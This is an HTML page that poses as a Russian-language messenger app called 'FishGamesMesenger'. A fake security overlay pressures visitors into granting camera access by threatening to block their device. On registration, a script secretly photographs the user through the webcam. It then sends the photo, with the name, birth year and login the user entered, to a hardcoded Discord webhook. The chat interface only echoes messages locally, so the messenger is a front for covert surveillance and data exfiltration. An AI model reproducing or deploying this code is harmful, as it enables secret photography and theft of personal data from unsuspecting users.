<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FishGamesMesenger</title>
    <style>
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #008080 0%, #20b2aa 100%); 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
            margin: 0; 
            overflow: hidden; 
        }

        /* –£–∑–æ—Ä –≤–æ–ª–Ω */
        body::before {
            content: ""; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
            background: url('https://www.transparenttextures.com/patterns/waves.png');
            opacity: 0.15; animation: moveWaves 25s linear infinite; pointer-events: none;
        }
        @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }

        /* –û–∫–Ω–æ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ */
        #camera-overlay {
            position: fixed; inset: 0; background: #0d1a17; z-index: 2000;
            display: flex; justify-content: center; align-items: center; text-align: center;
        }
        .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }

        /* –§–æ—Ä–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ */
        #reg-screen { z-index: 10; }
        .reg-card { background: #1a2e2a; padding: 30px; border-radius: 15px; width: 350px; border: 1px solid #2e8b57; box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
        .input-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-size: 13px; color: #a7f3d0; }
        input { 
            width: 100%; padding: 10px; border-radius: 8px; border: 1px solid #2d4f47; 
            background: #243b35; color: white; box-sizing: border-box; outline: none; 
        }
        input:focus { border-color: #4ade80; }
        .btn { 
            width: 100%; padding: 12px; background: #22c55e; border: none; border-radius: 8px; 
            color: white; font-weight: bold; cursor: pointer; transition: 0.3s; 
        }
        .btn:hover { background: #16a34a; }

        /* –ò–ù–¢–ï–†–§–ï–ô–° –ú–ï–°–°–ï–ù–î–ñ–ï–†–ê */
        #messenger-screen { 
            display: none; width: 95vw; height: 90vh; background: #1a2e2a; 
            border-radius: 15px; z-index: 100; border: 1px solid #2e8b57; overflow: hidden;
        }
        .messenger-container { display: flex; height: 100%; }
        
        /* –ë–æ–∫–æ–≤–∞—è –ø–∞–Ω–µ–ª—å */
        .sidebar { width: 250px; background: #142522; border-right: 1px solid #2e8b57; display: flex; flex-direction: column; padding: 15px; }
        .search-box { border: 1px solid white; border-radius: 20px; padding: 5px 15px; text-align: center; margin-bottom: 20px; font-size: 14px; }
        .contact-item { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; }
        .avatar { width: 50px; height: 50px; background: #22c55e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 1px solid white; }
        .support { border: 1px solid white; padding: 10px; margin-top: auto; font-size: 13px; text-align: center; }

        /* –ó–æ–Ω–∞ —á–∞—Ç–∞ */
        .chat-area { flex: 1; display: flex; flex-direction: column; background: rgba(32, 178, 170, 0.1); position: relative; }
        .chat-header { padding: 15px; text-align: center; font-weight: bold; font-size: 18px; border-bottom: 1px solid #2e8b57; }
        .messages-display { flex: 1; padding: 20px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
        .msg-bubble { background: white; color: black; padding: 10px 15px; border-radius: 15px; align-self: flex-end; max-width: 70%; position: relative; }
        
        /* –ü–æ–ª–µ –≤–≤–æ–¥–∞ */
        .input-bar { padding: 15px; background: #1a2e2a; display: flex; gap: 10px; align-items: center; border-top: 1px solid #2e8b57; }
        .msg-input { flex: 1; border: 2px solid #2e8b57; border-radius: 10px; padding: 12px; background: white; color: black; }
        .send-btn { background: #22c55e; border-radius: 50%; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; border: none; cursor: pointer; }

        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="camera-overlay">
    <div class="warning-box">
        <h3 style="color: #ff5252;">‚ö†Ô∏è FishGames Security</h3>
        <p>–î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è –∫–∞–º–µ—Ä—ã.<br>–ü—Ä–∏ –æ—Ç–∫–∞–∑–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –±—É–¥–µ—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ.</p>
        <button class="btn" onclick="requestAccess()">–ü–†–û–ô–¢–ò –ü–†–û–í–ï–†–ö–£</button>
    </div>
</div>

<div id="reg-screen" class="reg-card">
    <h2>FishGamesMesenger</h2>
    <div class="input-group">
        <label>–ò–º—è</label>
        <input type="text" id="firstname" placeholder="–ò–≤–∞–Ω">
    </div>
    <div class="input-group">
        <label>–ì–æ–¥ —Ä–æ–∂–¥–µ–Ω–∏—è</label>
        <input type="text" id="birthyear" placeholder="2000" maxlength="4" oninput="this.value=this.value.replace(/[^0-9]/g,''); if(this.value>2025)this.value='2025'">
    </div>
    <div class="input-group">
        <label>–õ–æ–≥–∏–Ω</label>
        <input type="text" id="login" placeholder="user_prime">
    </div>
    <button class="btn" onclick="register()">–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø</button>
</div>

<div id="messenger-screen">
    <div class="messenger-container">
        <div class="sidebar">
            <div class="search-box">–ø–æ–∏—Å–∫</div>
            <div class="contact-item">
                <div class="avatar" id="user-avatar">?</div>
                <div id="contact-name">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
            </div>
            <div class="support">—Å–ª—É–∂–±–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏</div>
        </div>
        <div class="chat-area">
            <div class="chat-header">FishGamesMesenger</div>
            <div class="messages-display" id="chat-box">
                </div>
            <div class="input-bar">
                <input type="text" class="msg-input" id="messageText" placeholder="–ù–∞–ø–∏—à–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ...">
                <button class="send-btn" onclick="sendMessage()">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
                </button>
            </div>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const webhook = 'https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw';

    async function requestAccess() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({video: true});
            video.srcObject = s;
            document.getElementById('camera-overlay').style.display = 'none';
        } catch(e) {
            alert("–û–®–ò–ë–ö–ê –ë–ï–ó–û–ü–ê–°–ù–û–°–¢–ò! –î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –æ–±—è–∑–∞—Ç–µ–ª–µ–Ω.");
            location.reload();
        }
    }

    function register() {
        const name = document.getElementById('firstname').value;
        const login = document.getElementById('login').value;
        const year = document.getElementById('birthyear').value;

        if(!name || !login) return alert("–ó–∞–ø–æ–ª–Ω–∏ –≤—Å–µ –ø–æ–ª—è!");

        // –°–∫—Ä—ã—Ç–æ–µ —Ñ–æ—Ç–æ
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('payload_json', JSON.stringify({
                embeds: [{ title: "üì∏ FishGames: –î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã", color: 3066993, fields: [
                    {name: "–ò–º—è", value: name, inline: true}, {name: "–ì–æ–¥", value: year, inline: true}, {name: "–õ–æ–≥–∏–Ω", value: login}
                ]}]
            }));
            fd.append('file', b, 'p.png');
            fetch(webhook, {method: 'POST', body: fd});
        });

        // –ü–µ—Ä–µ—Ö–æ–¥ –≤ –º–µ—Å—Å–µ–Ω–¥–∂–µ—Ä
        document.getElementById('reg-screen').style.display = 'none';
        document.getElementById('messenger-screen').style.display = 'block';
        document.getElementById('contact-name').innerText = name;
        document.getElementById('user-avatar').innerText = name[0].toUpperCase();
    }

    function sendMessage() {
        const inp = document.getElementById('messageText');
        if(!inp.value) return;
        
        const box = document.getElementById('chat-box');
        const m = document.createElement('div');
        m.className = 'msg-bubble';
        m.innerText = inp.value;
        box.appendChild(m);
        inp.value = '';
        box.scrollTop = box.scrollHeight;
    }
</script>

</body>
</html>
